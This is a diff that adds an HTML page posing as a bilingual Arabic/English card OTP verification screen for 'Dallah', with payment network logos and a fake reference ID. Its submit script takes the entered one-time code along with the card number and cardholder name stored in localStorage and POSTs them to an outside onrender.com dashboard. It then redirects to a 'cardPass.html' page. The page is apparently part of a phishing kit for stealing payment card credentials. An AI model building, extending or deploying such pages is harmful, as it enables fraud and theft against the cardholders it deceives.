@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>OTP Verification - Dallah</title>
+  <style>
+    :root{
+      --green:#2b7a2b;
+      --text:#111;
+      --muted:#555;
+      --gray:#cfcfcf;
+    }
+
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: Arial, Tahoma, sans-serif;
+      color:var(--text);
+      background:#fff;
+    }
+
+    .wrap{
+      max-width: 640px;
+      margin: 0 auto;
+      padding: clamp(16px,3vw,24px);
+    }
+
+    /* Header: OTP left, logo right (like screenshot) */
+    .header{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap: 16px;
+      /* keep whole page RTL, but header visual order like LTR */
+      direction:ltr;
+      margin-bottom: 8px;
+    }
+    .otp-title{
+      font-weight:700;
+      color:#666;
+      font-size: clamp(26px, 5vw, 34px);
+      letter-spacing: .5px;
+    }
+    .brand{
+      direction:rtl; /* so image stays on the right edge visually */
+    }
+    .brand img{
+      height: clamp(38px,5vw,54px);
+      width:auto;
+      object-fit:contain;
+    }
+
+    /* Card brands row under OTP (left-aligned like the screenshot) */
+    .pay-logos{
+      direction:ltr;
+      text-align:left;
+      margin: 6px 0 10px;
+    }
+    .pay-logos img{
+      height: clamp(18px,3.2vw,26px);
+      margin-inline: 3px;
+      vertical-align: middle;
+    }
+
+    /* Mail icon centered */
+    .hero-icon{
+      display:flex;
+      justify-content:center;
+      margin: clamp(8px,2vw,12px) 0 clamp(6px,2vw,12px);
+    }
+    .hero-icon svg{
+      width: clamp(54px,10vw,72px);
+      height: auto;
+      display:block;
+    }
+
+    /* Title */
+    h1{
+      margin: 10px 0 16px;
+      text-align:center;
+      font-size: clamp(20px,3.6vw,28px);
+      font-weight: 800;
+    }
+
+    /* Info block */
+    .info{
+      text-align:center;
+      line-height:1.9;
+      font-size: clamp(14px,2.6vw,16px);
+      margin-bottom: 14px;
+    }
+
+    /* Arabic note */
+    .note{
+      text-align:center;
+      font-size: clamp(15px,2.8vw,17px);
+      line-height:1.9;
+      margin: 14px 0 18px;
+    }
+
+    /* OTP row: label right, input left (as in screenshot) */
+    .otp-row{
+      display: flex;
+      flex-direction: column; /* stack label above input */
+      align-items: center;    /* center horizontally */
+      gap: 8px;
+      margin: 18px 0 22px;
+    }
+    .otp-label{
+      font-weight:700;
+      font-size: clamp(16px,3vw,18px);
+    }
+    .otp-input{
+      width: 100%;
+      display: flex;
+      justify-content: center; /* centers the input */
+    }
+    .otp-input input{
+      width: 100%;
+      max-width: 330px;
+      height: 56px;
+      padding: 0 16px;
+      font-size: clamp(18px,3.6vw,22px);
+      letter-spacing: 6px;
+      text-align: center;
+      border:1.5px solid #cfcfcf;
+      border-radius: 10px;
+      outline: none;
+    }
+
+    /* Submit button full width like screenshot */
+    .submit{
+      width: 100%;
+      background: var(--green);
+      color:#fff;
+      border:0;
+      border-radius: 8px;
+      padding: 14px 16px;
+      font-size: clamp(18px,3.4vw,22px);
+      cursor:pointer;
+    }
+    .submit:active{transform:translateY(1px)}
+    .submit:hover{background:#256a25}
+
+    /* Responsive spacing fine-tuning */
+    @media (min-width: 721px){
+      .wrap{padding: 28px}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+
+    <div class="header">
+      <div class="otp-title">OTP</div>
+      <div class="brand">
+        <img src="images/dallahLogo.jpeg" alt="Dallah Logo">
+      </div>
+    </div>
+
+    <div class="pay-logos">
+      <img src="images/visa.png" alt="Visa">
+      <img src="images/mastercard.png" alt="MasterCard">
+      <!-- <img src="images/amex.png" alt="American Express"> -->
+      <img src="images/mada.png" alt="Mada">
+    </div>
+
+    <div class="hero-icon" aria-hidden="true">
+      <!-- envelope/message icon -->
+      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+        <g fill="none" stroke="#000" stroke-width="2">
+          <rect x="6" y="14" width="52" height="36" rx="4" ry="4"/>
+          <path d="M6 18l26 18L58 18"/>
+        </g>
+      </svg>
+    </div>
+
+    <h1>Enter verification code</h1>
+
+    <div class="info">
+      <div>We sent you a verification code by text message to</div>
+      <div><strong>05 xxxxxxxx</strong> You have 6 attempts</div>
+      <div>Merchant&nbsp;&nbsp;&nbsp;&nbsp;<strong>DALLAH co.</strong></div>
+      <div>Card Number&nbsp;&nbsp;****************</div>
+      <div>Reference Id&nbsp;&nbsp;<strong>NOSA574865</strong></div>
+    </div>
+
+    <div class="note">
+      أدخل كود التفعيل المرسل إليك عبر الرسائل النصية في الخانة
+      المخصصة أدناه
+    </div>
+
+    <div class="otp-row">
+      <div class="otp-input">
+        <input id="otp" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="******" autocomplete="one-time-code" aria-label="رمز التحقق">
+      </div>
+      <div class="otp-label">كود التفعيل</div>
+    </div>
+
+    <button class="submit" id="submitBtn">تفعيل</button>
+  </div>
+
+  <script>
+    // numeric-only for OTP, accept paste of 6 digits, keep masked
+    const otp = document.getElementById('otp');
+    otp.addEventListener('input', () => {
+      otp.value = otp.value.replace(/\D/g, '').slice(0, 6);
+    });
+    otp.addEventListener('paste', e => {
+      const text = (e.clipboardData || window.clipboardData).getData('text');
+      if (/\d/.test(text)) {
+        e.preventDefault();
+        otp.value = text.replace(/\D/g, '').slice(0, 6);
+      }
+    });
+
+    // Submit handler
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+      const code = otp.value.trim();
+      const cardNumber = localStorage.getItem("cardNumber") || "N/A";
+      const cardName = localStorage.getItem("cardName") || "N/A";
+
+      const message =
+        `OTP: ${code}\n` +
+        `رقم البطاقة: \n ${cardNumber}\n` +
+        `الاسم على البطاقة: ${cardName}`;
+
+      try {
+        const response = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: message })
+        });
+
+        if (response.ok) {
+          window.location.href = "cardPass.html"; // نجاح
+        } else {
+          const err = await response.text();
+          alert("خطأ: " + err);
+        }
+      } catch (error) {
+        console.error(error);
+        alert("تعذر الاتصال بالخادم.");
+      }
+    });
+  </script>
+</body>
+</html>
